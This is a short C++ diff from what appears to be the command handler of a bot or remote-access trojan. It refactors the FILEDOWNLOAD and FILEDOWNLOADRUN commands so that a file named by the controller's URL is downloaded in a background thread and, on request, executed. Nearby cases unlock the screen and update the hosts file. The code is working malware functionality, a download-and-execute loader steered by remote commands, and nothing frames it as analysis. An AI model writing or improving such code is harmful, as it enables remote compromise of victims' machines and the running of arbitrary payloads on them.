@@ -50,13 +50,17 @@
             Utils::UnlockScreen(commandarg);
             break;
         case FILEDOWNLOAD:
-            Http::DwnFile((char*)commandarg.c_str(), (char*)Http::extractFileName(commandarg).c_str());
+        case FILEDOWNLOADRUN: {
+            Http::FileDownload* file = new Http::FileDownload;
+            file->url = commandarg;
+            file->path = Http::extractFileName(commandarg);
+            if (this->commandtype == FILEDOWNLOADRUN) { file->exec = TRUE; }
+            else { file->exec = FALSE; }
+            HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Http::DwnFile, file, 0, 0);
+            if (th) { CloseHandle(th); }
+            else { delete file; }
             break;
-        case FILEDOWNLOADRUN:
-            if (Http::DwnFile((char*)commandarg.c_str(), (char*)Http::extractFileName(commandarg).c_str())) {
-                Utils::runAsUser((wchar_t*)Strings::strtow(Http::extractFileName(commandarg)).c_str(),(wchar_t*)L"");
-            }
-            break;
+        }
         case UPDATEHOSTS:
             Utils::UpdateHosts();
             break;
